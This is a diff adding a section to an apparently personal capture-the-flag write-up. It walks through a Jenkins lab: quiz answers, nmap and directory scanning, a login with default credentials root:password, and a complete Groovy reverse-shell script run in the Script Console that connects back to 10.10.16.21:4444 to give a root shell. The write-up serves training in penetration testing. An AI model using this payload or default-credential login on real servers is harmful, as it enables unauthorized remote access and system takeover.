@@ -398,3 +398,73 @@ This what i get, but rember to decode this in URL :P
 ![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/fc3968a6-dbdb-476b-bcbd-4261c0ef2d90)
 
 And we did this :)
+
+
+The next lab is:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e1568ccf-8858-454e-9645-73c0e047fb71)
+
+1.What does the acronym CVE stand for? 
+We need to google what that's mean acronym CVE, because i don't remember.
+And i found, this mean common vulnerabilities and exposures
+
+2.What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for? 
+Also this we need to google, because i have no idea what can this mean. Also this was quick to find, here's the answer:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/1d004122-f045-4d5b-ae7e-686455797ba9)
+
+3. What is the version of the service running on port 8080? 
+Now we need to turn on the nmap, on the server is only one port, here's the results:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/cd910b80-8696-4564-8678-b75029ab766a)
+
+4. What version of Jenkins is running on the target? 
+I turn on the feroxbuster to find some directory, beacause on the main page i can't find anything
+I found something intresting and there is the version, in this directory /oops
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/ba5c4d87-b260-43d5-ab51-8afa407bd912)
+
+This how look's the page.
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/74202af8-ab9d-41a9-89cc-a64cad028f44)
+
+5. What type of script is accepted as input on the Jenkins Script Console? 
+I did some recon in source code by command: curl -v, but without results the i tought maybe google it and i found what i want :P
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e852c6ef-bb34-479e-8ea4-2fb3c3f60b84)
+
+6. What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows? 
+The answer is cmd.exe but i don't know why, when i think about something about Windows at the end i have only in my mind .exe, i tryed cmd.exe and we got this :D
+
+7.What is a different command than "ip a" we could use to display our network interfaces' information on Linux? 
+This will be: ifconfig 
+
+8. What switch should we use with netcat for it to use UDP transport mode? 
+I check this by command netcat -h, this will be -u:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/ac95c252-5374-47ff-a60d-d3247e0c60ac)
+
+9. What is the term used to describe making a target host initiate a connection back to the attacker host? 
+This will be reverse shell
+
+10. Submit root flag 
+Wow, that was so easy i think around 1 min, and i don't have idea but i think maybe i need move back to log in panel, i tryed many creds to get access into this panel, root:password with this creds u can get a access.
+Then i found build executor status, there was script console i found reverse shell for Jenkis on this blog: https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6 But we know the server running on Linux, change cmd.exe to /bin/bash, then turn on the netcat and run this shell:
+
+```
+String host="10.10.16.21";
+int port=4444;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
+Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
+{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
+while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
+{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+And we did this, you have access by root 
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/a86120b4-88cd-43d5-853c-34f76fc978c3)
+
